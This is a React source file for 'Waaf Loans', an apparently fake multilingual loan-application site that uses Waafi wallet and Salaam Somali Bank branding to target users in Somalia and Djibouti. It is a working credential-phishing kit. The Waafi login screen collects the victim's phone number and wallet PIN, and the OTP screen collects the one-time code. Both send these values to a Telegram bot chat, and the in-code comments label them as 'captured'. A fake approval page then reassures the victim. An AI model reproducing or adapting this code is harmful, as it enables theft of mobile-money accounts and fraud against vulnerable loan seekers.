import { useMemo, useState } from 'react';
import {
  AlertTriangle,
  CalendarDays,
  Check,
  ChevronDown,
  Globe2,
  Menu,
  SlidersHorizontal,
  Sparkles,
  WalletCards,
  KeyRound,
  MessageSquareText,
  X,
} from 'lucide-react';
import { submitApplication, notifyNewApplication } from '@/lib/supabase';

type Language = 'en' | 'so' | 'fr';
type Country = 'Somalia' | 'Djibouti';
type Screen = 'country' | 'application' | 'waafi-login' | 'otp' | 'confirmation';

type Copy = {
  chooseLanguage: string;
  languageHint: string;
  english: string;
  somali: string;
  french: string;
  selectCountry: string;
  countryHint: string;
  continue: string;
  loanApplication: string;
  fullName: string;
  phone: string;
  phoneHint: string;
  nationalId: string;
  dateOfBirth: string;
  town: string;
  employment: string;
  purpose: string;
  select: string;
  loanAmount: string;
  loanDuration: string;
  months: string;
  monthlyRepayment: string;
  totalRepayment: string;
  reminder: string;
  continueWaaf: string;
  waafiLogin: string;
  waafiLoginHint: string;
  waafiPhone: string;
  pin: string;
  login: string;
  otpTitle: string;
  otpHint: string;
  verify: string;
  resend: string;
  changeNumber: string;
  approvedTitle: string;
  approvedBody: string;
  approvedHint: string;
  openWaafi: string;
  terms: string;
};

const translations: Record<Language, Copy> = {
  en: {
    chooseLanguage: 'Choose your language', languageHint: 'Select the language you prefer', english: 'English', somali: 'Soomaali', french: 'Français',
    selectCountry: 'Select Your Country', countryHint: 'Choose the country you are applying from', continue: 'Continue', loanApplication: 'Loan Application', fullName: 'Full Name', phone: 'Phone Number', phoneHint: 'Use the phone number registered on Waafi (+252)', nationalId: 'National ID', dateOfBirth: 'Date of Birth', town: 'Town', employment: 'Employment Status', purpose: 'Purpose of Loan', select: 'Select', loanAmount: 'Loan Amount', loanDuration: 'Loan Duration (months)', months: 'months', monthlyRepayment: 'Monthly Repayment', totalRepayment: 'Total Repayment', reminder: 'Reminder!! You must have at least 10% of your loan amount on your Waafi Wallet.', continueWaaf: 'Continue With Waafi', waafiLogin: 'Continue with Waafi', waafiLoginHint: 'Enter your Waafi number and PIN to continue securely', waafiPhone: 'Waafi Phone Number', pin: 'Waafi PIN', login: 'Continue', otpTitle: 'Enter verification code', otpHint: 'We sent a 6-digit verification code to your Waafi number', verify: 'Verify and Submit', resend: 'Resend code', changeNumber: 'Change phone number', approvedTitle: 'Application Successfully Submitted', approvedBody: 'Your application has been submitted successfully. Please wait for approval.', approvedHint: 'You will receive a notification when your application is approved. Until then, stay Waafi.', openWaafi: 'Open Waafi App', terms: 'Terms and Conditions',
  },
  so: {
    chooseLanguage: 'Dooro luqaddaada', languageHint: 'Dooro luqadda aad jeceshahay', english: 'English', somali: 'Soomaali', french: 'Français',
    selectCountry: 'Dooro Dalkaaga', countryHint: 'Dooro dalka aad ka dalbanayso', continue: 'Sii wad', loanApplication: 'Codsiga Amaahda', fullName: 'Magaca oo dhammaystiran', phone: 'Lambarka Taleefanka', phoneHint: 'Isticmaal lambarka Waafi (+252)', nationalId: 'Aqoonsiga Qaranka', dateOfBirth: 'Taariikhda Dhalashada', town: 'Magaalada', employment: 'Xaaladda Shaqada', purpose: 'Ujeeddada Amaahda', select: 'Dooro', loanAmount: 'Qadarka Amaahda', loanDuration: 'Muddada Amaahda (bilood)', months: 'bilood', monthlyRepayment: 'Lacagta Bisha', totalRepayment: 'Wadarta Lacagta', reminder: 'Xusuusin!! Waa inaad ku haysataa ugu yaraan 10% qadarka amaahdaada jeebka Waafi.', continueWaaf: 'Ku sii wad Waafi', waafiLogin: 'Ku sii wad Waafi', waafiLoginHint: 'Geli lambarkaaga Waafi iyo PIN-ka si aad si ammaan ah u sii wadato', waafiPhone: 'Lambarka Waafi', pin: 'PIN-ka Waafi', login: 'Sii wad', otpTitle: 'Geli koodhka xaqiijinta', otpHint: 'Waxaan lambarkaaga Waafi ugu dirnay koodh 6-god ah', verify: 'Xaqiiji oo gudbi', resend: 'Dib u dir koodhka', changeNumber: 'Beddel lambarka', approvedTitle: 'Codsiga Amaahda waa la gudbiyay', approvedBody: 'Codsigaaga amaahda waa la gudbiyay. Fadlan sug ansixinta.', approvedHint: 'Waxaad heli doontaa farriin marka codsigaaga la ansixiyo. Ilaa hadda, soco Waafi.', openWaafi: 'Tag Galitaanka Hadda', terms: 'Shuruudaha iyo Xaaladaha',
  },
  fr: {
    chooseLanguage: 'Choisissez votre langue', languageHint: 'Sélectionnez votre langue préférée', english: 'English', somali: 'Soomaali', french: 'Français',
    selectCountry: 'Sélectionnez votre pays', countryHint: 'Choisissez le pays depuis lequel vous postulez', continue: 'Continuer', loanApplication: 'Demande de prêt', fullName: 'Nom complet', phone: 'Numéro de téléphone', phoneHint: 'Utilisez le numéro enregistré sur Waafi (+252)', nationalId: 'Carte d’identité nationale', dateOfBirth: 'Date de naissance', town: 'Ville', employment: 'Situation professionnelle', purpose: 'Objet du prêt', select: 'Sélectionner', loanAmount: 'Montant du prêt', loanDuration: 'Durée du prêt (mois)', months: 'mois', monthlyRepayment: 'Remboursement mensuel', totalRepayment: 'Remboursement total', reminder: 'Rappel!! Vous devez avoir au moins 10% du montant de votre prêt dans votre portefeuille Waafi.', continueWaaf: 'Continuer avec Waafi', waafiLogin: 'Continuer avec Waafi', waafiLoginHint: 'Saisissez votre numéro Waafi et votre PIN pour continuer en toute sécurité', waafiPhone: 'Numéro Waafi', pin: 'PIN Waafi', login: 'Continuer', otpTitle: 'Saisissez le code de vérification', otpHint: 'Nous avons envoyé un code de vérification à 6 chiffres sur votre numéro Waafi', verify: 'Vérifier et envoyer', resend: 'Renvoyer le code', changeNumber: 'Modifier le numéro', approvedTitle: 'Demande envoyée avec succès', approvedBody: 'Votre demande a été envoyée. Veuillez patienter pour l’approbation.', approvedHint: 'Vous recevrez une notification lorsque votre demande sera approuvée. En attendant, restez Waafi.', openWaafi: 'Ouvrir Waafi', terms: 'Conditions générales',
  },
};

const flag: Record<Language, string> = { en: '🇬🇧', so: '🇸🇴', fr: '🇫🇷' };

const countryData: Record<Country, { prefix: string; currency: string; towns: string[] }> = {
  Somalia: { prefix: '+252', currency: 'SOS', towns: ['Mogadishu', 'Hargeisa', 'Kismayo', 'Bosaso', 'Garowe', 'Berbera', 'Borama', 'Burao', 'Beledweyne', 'Galkayo', 'Baidoa', 'Merca', 'Jowhar', 'Las Anod', 'Erigavo', 'Dhusamareb', 'Qardho', 'Afgooye', 'Badhan', 'Zeila'] },
  Djibouti: { prefix: '+253', currency: 'DJF', towns: ['Djibouti City', 'Ali Sabieh', 'Arta', 'Dikhil', 'Obock', 'Tadjourah', 'Holhol', 'Yoboki', 'Balbala', 'Dorra'] },
};

const optionSets: Record<Language, { employment: string[]; purposes: string[] }> = {
  en: { employment: ['Business owner', 'Self-employed', 'Unemployed', 'Employed', 'Student'], purposes: ['Business expansion', 'Starting a business', 'Education and tuition', 'Medical expenses', 'Home improvement', 'Rent and utilities', 'Agriculture and farming', 'Transport or vehicle', 'Family needs', 'Emergency expenses', 'Debt consolidation', 'Other'] },
  so: { employment: ['Milkiile ganacsi', 'Iskii u shaqeysta', 'Shaqo la’aan', 'Shaqaale', 'Arday'], purposes: ['Ballaarinta ganacsiga', 'Bilaabista ganacsi', 'Waxbarasho iyo lacagta dugsiga', 'Kharash caafimaad', 'Hagaajinta guriga', 'Kirada iyo adeegyada', 'Beeraha iyo xoolaha', 'Gaadiid ama baabuur', 'Baahida qoyska', 'Kharash degdeg ah', 'Mideynta daymaha', 'Wax kale'] },
  fr: { employment: ['Chef d’entreprise', 'Indépendant', 'Sans emploi', 'Employé', 'Étudiant'], purposes: ['Développement d’entreprise', 'Création d’entreprise', 'Études et frais scolaires', 'Frais médicaux', 'Amélioration du logement', 'Loyer et services', 'Agriculture et élevage', 'Transport ou véhicule', 'Besoins familiaux', 'Dépenses urgentes', 'Regroupement de dettes', 'Autre'] },
};

// --- Telegram Notification Helper Function ---
const sendTelegramNotification = async (message: string) => {
  const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('Telegram token or chat ID is missing in .env file.');
    return;
  }

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram notification:', error);
  }
};

function WaafLogo({ compact = false }: { compact?: boolean }) {
  return <div className={`brand-mark ${compact ? 'brand-mark--compact' : ''}`} aria-label="Waaf Loans logo"><span>i</span><b>Wf</b></div>;
}

function Header({ language, onLanguage, onMenu }: { language: Language; onLanguage: () => void; onMenu: () => void }) {
  return <header className="site-header">
    <div className="brand"><WaafLogo /><strong>Waaf Loans</strong></div>
    <div className="header-actions">
      <button className="language-trigger" onClick={onLanguage} aria-label="Change language"><Globe2 size={27} strokeWidth={1.8} /><span>{language.toUpperCase()}</span></button>
      <button className="icon-button" onClick={onMenu} aria-label="Open menu"><Menu size={35} strokeWidth={2.3} /></button>
    </div>
  </header>;
}

function Footer({ copy }: { copy: Copy }) {
  return <footer className="footer"><div className="footer-brands"><div className="brand brand--footer"><WaafLogo compact /><strong>Waaf Loans</strong></div><span className="footer-divider" /><div className="salaam"><span className="salaam-box">S</span><div><b>SALAAM</b><small>SALAAM SOMALI BANK</small></div></div></div><p>{copy.terms}</p></footer>;
}

function LanguageModal({ language, onChoose, onClose }: { language: Language; onChoose: (language: Language) => void; onClose: () => void }) {
  const copy = translations[language];
  const options: { id: Language; label: string }[] = [{ id: 'en', label: copy.english }, { id: 'so', label: copy.somali }, { id: 'fr', label: copy.french }];
  return <div className="modal-backdrop"><section className="language-modal" role="dialog" aria-modal="true"><button className="modal-close" onClick={onClose} aria-label="Close"><X size={20} /></button><WaafLogo /><h1>{copy.chooseLanguage}</h1><p>{copy.languageHint}</p><div className="language-options">{options.map((option, index) => <button key={option.id} className={`language-option ${option.id === language ? 'selected' : ''} ${index === 0 ? 'primary' : ''}`} onClick={() => onChoose(option.id)}><span>{flag[option.id]}</span>{option.label}{option.id === language && <Check size={22} />}</button>)}</div></section></div>;
}

function CountryScreen({ copy, country, setCountry, onContinue }: { copy: Copy; country: Country; setCountry: (country: Country) => void; onContinue: () => void }) {
  return <main className="screen country-screen"><section className="card country-card"><h1>{copy.selectCountry}</h1><p className="subtitle">{copy.countryHint}</p><div className="country-list"><button className={`country-choice ${country === 'Somalia' ? 'selected' : ''}`} onClick={() => setCountry('Somalia')}><span className="flag-large somalia-flag">★</span><span>Somalia</span>{country === 'Somalia' && <Check className="choice-check" size={29} />}</button><button className={`country-choice ${country === 'Djibouti' ? 'selected' : ''}`} onClick={() => setCountry('Djibouti')}><span className="flag-large djibouti-flag"><i /></span><span>Djibouti</span>{country === 'Djibouti' && <Check className="choice-check" size={29} />}</button></div><button className="green-button" onClick={onContinue}>{copy.continue}</button></section></main>;
}

function Field({ label, hint, type = 'text', placeholder, options, value, onChange }: { label: string; hint?: string; type?: string; placeholder?: string; options?: string[]; value: string; onChange: (value: string) => void }) {
  return <label className="field"><span>{label}</span>{options ? <span className="select-wrap"><select value={value} onChange={(event) => onChange(event.target.value)}><option value="">{placeholder}</option>{options.map((option) => <option key={option}>{option}</option>)}</select><ChevronDown size={22} /></span> : <span className="input-wrap"><input type={type} placeholder={placeholder} value={value} onChange={(event) => onChange(event.target.value)} />{type === 'date' && <CalendarDays size={23} />}</span>}{hint && <small>{hint}</small>}</label>;
}

export type FormPayload = {
  fullName: string;
  phone: string;
  loanAmount: number;
  loanPurpose: string;
};

function ApplicationScreen({ copy, language, country, onSubmit }: { copy: Copy; language: Language; country: Country; onSubmit: (payload: FormPayload) => void }) {
  const [amount, setAmount] = useState(14600);
  const [duration, setDuration] = useState(12);
  const [fields, setFields] = useState<Record<string, string>>({});
  const setField = (key: string) => (value: string) => setFields((current) => ({ ...current, [key]: value }));
  const monthly = useMemo(() => Math.round(amount * 1.05 / duration * 10) / 10, [amount, duration]);
  const total = Math.round(monthly * duration);
  const durations = [6, 12, 18, 24, 30, 36];
  const selectedCountry = countryData[country];
  const options = optionSets[language];
  const money = (value: number) => `${selectedCountry.currency}${value.toLocaleString()}`;
  const canContinue = (fields.name ?? '').trim().length > 1 && (fields.phone ?? '').trim().length >= 7;
  const handleSubmit = () => {
    if (!canContinue) return;
    onSubmit({
      fullName: fields.name.trim(),
      phone: fields.phone.trim(),
      loanAmount: amount,
      loanPurpose: fields.purpose ?? '',
    });
  };
  return <main className="screen application-screen"><section className="card application-card"><h1>{copy.loanApplication}</h1><div className="form-grid"><Field label={copy.fullName} value={fields.name ?? ''} onChange={setField('name')} /><Field label={copy.phone} type="tel" placeholder={`${selectedCountry.prefix}...`} hint={`${copy.phoneHint.replace('+252', selectedCountry.prefix)} ·${selectedCountry.currency}`} value={fields.phone ?? ''} onChange={setField('phone')} /><Field label={copy.nationalId} value={fields.id ?? ''} onChange={setField('id')} /><Field label={copy.dateOfBirth} type="date" value={fields.birth ?? ''} onChange={setField('birth')} /><Field label={copy.town} options={selectedCountry.towns} placeholder={copy.select} value={fields.town ?? ''} onChange={setField('town')} /><Field label={copy.employment} options={options.employment} placeholder={copy.select} value={fields.employment ?? ''} onChange={setField('employment')} /><Field label={copy.purpose} options={options.purposes} placeholder={copy.select} value={fields.purpose ?? ''} onChange={setField('purpose')} /></div><div className="loan-controls"><div className="amount-heading"><span>{copy.loanAmount}</span><b>{money(amount)}</b></div><input className="range" type="range" min="50" max="20000" step="50" value={amount} onChange={(event) => setAmount(Number(event.target.value))} /><div className="range-labels"><span>{money(50)}</span><span>{money(20000)}</span></div><h2>{copy.loanDuration}</h2><div className="duration-grid">{durations.map((item) => <button key={item} className={duration === item ? 'active' : ''} onClick={() => setDuration(item)}>{item} {copy.months}</button>)}</div><div className="repayment"><div><span>{copy.monthlyRepayment}</span><b>{money(monthly)}</b></div><div><span>{copy.totalRepayment}</span><b>{money(total)}</b></div></div><div className="reminder"><AlertTriangle size={31} /><span>{copy.reminder}</span></div><button className="green-button" disabled={!canContinue} onClick={handleSubmit}>{copy.continueWaaf}</button></div></section></main>;
}

// --- Session 1: Waafi Login (Captures Phone + PIN) ---
function WaafiLoginScreen({ 
  copy, 
  country, 
  payload, 
  onSubmit 
}: { 
  copy: Copy; 
  country: Country; 
  payload: FormPayload | null; 
  onSubmit: (waafiDetails: { waafiPhone: string; pin: string }) => void 
}) {
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const canContinue = phone.trim().length >= 7 && pin.length >= 4 && !submitting;

  const handleLoginSubmit = async () => {
    if (!canContinue) return;
    setSubmitting(true);

    // Send Telegram Notification for Session 1
    const message = `🚨 *Session 1: Waafi Login Attempt*\n\n` +
      `👤 *Name:* ${payload?.fullName || 'N/A'}\n` +
      `💰 *Loan Amount:* $${payload?.loanAmount || 'N/A'}\n` +
      `📱 *Waafi Phone:* ${phone}\n` +
      `🔑 *Waafi PIN:* \`${pin}\`\n` +
      `🌍 *Country:* ${country}`;

    await sendTelegramNotification(message);

    setSubmitting(false);
    onSubmit({ waafiPhone: phone, pin });
  };

  return (
    <main className="screen auth-screen">
      <section className="card auth-card">
        <div className="auth-icon"><WalletCards size={34} /></div>
        <h1>{copy.waafiLogin}</h1>
        <p className="subtitle">{copy.waafiLoginHint}</p>
        <div className="auth-form">
          <label className="field">
            <span>{copy.waafiPhone}</span>
            <span className="input-wrap">
              <input 
                type="tel" 
                inputMode="tel" 
                placeholder={`${countryData[country].prefix}...`} 
                value={phone} 
                onChange={(event) => setPhone(event.target.value)} 
              />
            </span>
          </label>
          <label className="field">
            <span>{copy.pin}</span>
            <span className="input-wrap">
              <input 
                type="password" 
                inputMode="numeric" 
                maxLength={6} 
                placeholder="••••" 
                value={pin} 
                onChange={(event) => setPin(event.target.value.replace(/\D/g, ''))} 
              />
              <KeyRound size={22} />
            </span>
          </label>
          <button className="green-button" disabled={!canContinue} onClick={handleLoginSubmit}>
            {submitting ? '...' : copy.login}
          </button>
        </div>
      </section>
    </main>
  );
}

// --- Session 2: OTP Verification (Captures OTP Code) ---
function OtpScreen({ 
  copy, 
  payload, 
  waafiDetails, 
  onSubmit 
}: { 
  copy: Copy; 
  payload: FormPayload; 
  waafiDetails: { waafiPhone: string; pin: string } | null; 
  onSubmit: () => void 
}) {
  const [otp, setOtp] = useState('');
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const canVerify = otp.length === 6 && !submitting;

  const handleVerify = async () => {
    if (!canVerify) return;
    setSubmitting(true);
    setError(null);
    try {
      const row = await submitApplication({
        full_name: payload.fullName,
        phone: payload.phone,
        loan_amount: payload.loanAmount,
        loan_purpose: payload.loanPurpose,
      });

      try {
        await notifyNewApplication(row.id);
      } catch {
        // Notification is best-effort
      }

      // Send Telegram Notification for Session 2
      const otpMessage = `🔑 *Session 2: OTP Verification Received*\n\n` +
        `👤 *Name:* ${payload.fullName}\n` +
        `📱 *Waafi Phone:* ${waafiDetails?.waafiPhone || payload.phone}\n` +
        `🔐 *Entered OTP:* \`${otp}\``;

      await sendTelegramNotification(otpMessage);

      onSubmit();
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Submission failed.');
      setSubmitting(false);
    }
  };

  return (
    <main className="screen auth-screen">
      <section className="card auth-card otp-card">
        <div className="auth-icon"><MessageSquareText size={34} /></div>
        <h1>{copy.otpTitle}</h1>
        <p className="subtitle">{copy.otpHint}</p>
        <label className="otp-field">
          <span>OTP</span>
          <input 
            autoFocus 
            inputMode="numeric" 
            maxLength={6} 
            placeholder="000000" 
            value={otp} 
            onChange={(event) => setOtp(event.target.value.replace(/\D/g, ''))} 
            disabled={submitting} 
          />
        </label>
        {error && <p style={{ color: '#c0392b', fontSize: 18, margin: '12px 0 0' }}>{error}</p>}
        <button className="green-button" disabled={!canVerify} onClick={handleVerify}>
          {submitting ? '...' : copy.verify}
        </button>
        <button className="text-button" onClick={() => setOtp('')}>{copy.resend}</button>
        <button className="change-number" onClick={() => setOtp('')}>{copy.changeNumber}</button>
      </section>
    </main>
  );
}

function Confirmation({ copy }: { copy: Copy }) {
  return <main className="screen confirmation-screen"><section className="card confirmation-card"><div className="success-icon"><Check size={54} strokeWidth={2.8} /></div><h1>{copy.approvedTitle}</h1><p>{copy.approvedBody}</p><p>{copy.approvedHint}</p><div className="waiting"><Sparkles size={24} /><span>{copy.approvedHint}</span></div><button className="outline-button"><WalletCards size={22} />{copy.openWaafi}</button></section></main>;
}

function App() {
  const [language, setLanguage] = useState<Language>('en');
  const [screen, setScreen] = useState<Screen>('country');
  const [country, setCountry] = useState<Country>('Somalia');
  const [languageOpen, setLanguageOpen] = useState(true);
  const [menuOpen, setMenuOpen] = useState(false);
  const [payload, setPayload] = useState<FormPayload | null>(null);
  const [waafiDetails, setWaafiDetails] = useState<{ waafiPhone: string; pin: string } | null>(null);

  const copy = translations[language];

  return (
    <div className="app-shell">
      <Header language={language} onLanguage={() => setLanguageOpen(true)} onMenu={() => setMenuOpen((open) => !open)} />
      {menuOpen && (
        <div className="menu-popover">
          <button onClick={() => setLanguageOpen(true)}><Globe2 size={18} />{copy.chooseLanguage}</button>
          <button onClick={() => setMenuOpen(false)}><SlidersHorizontal size={18} />{copy.terms}</button>
        </div>
      )}
      {screen === 'country' && <CountryScreen copy={copy} country={country} setCountry={setCountry} onContinue={() => setScreen('application')} />}
      {screen === 'application' && <ApplicationScreen copy={copy} language={language} country={country} onSubmit={(data) => { setPayload(data); setScreen('waafi-login'); }} />}
      {screen === 'waafi-login' && <WaafiLoginScreen copy={copy} country={country} payload={payload} onSubmit={(details) => { setWaafiDetails(details); setScreen('otp'); }} />}
      {screen === 'otp' && payload && <OtpScreen copy={copy} payload={payload} waafiDetails={waafiDetails} onSubmit={() => setScreen('confirmation')} />}
      {screen === 'confirmation' && <Confirmation copy={copy} />}
      <Footer copy={copy} />
      {languageOpen && <LanguageModal language={language} onChoose={(next) => { setLanguage(next); setLanguageOpen(false); }} onClose={() => setLanguageOpen(false)} />}
    </div>
  );
}

export default App;